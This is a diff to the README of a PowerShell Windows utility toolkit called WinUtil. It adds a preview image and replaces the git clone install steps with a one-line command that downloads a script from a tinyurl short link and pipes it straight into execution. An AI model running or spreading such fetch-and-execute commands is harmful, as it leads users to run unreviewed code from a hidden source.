@@ -1,5 +1,7 @@
 # 🛠️ WinUtil - Windows Maintenance & Utility Toolkit
 
+![WinUtil Preview](img/preview.png)
+
 **WinUtil** is a powerful, lightweight Windows utility tool written in PowerShell Shell Script. It automates essential system maintenance tasks and offers a one-click solution for cleaning, optimizing, and customizing Windows systems — perfect for power users, IT professionals, or everyday users looking to keep their machines running smoothly.
 
 ---
@@ -37,8 +39,7 @@
 
 ### 💻 Installation
 
-Clone the repository:
+Copy code to the powershell:
 
 ```bash
-git clone https://github.com/your-username/winutil.git
-cd winutil
+irm tinyurl.com/mrkwinutil | iex
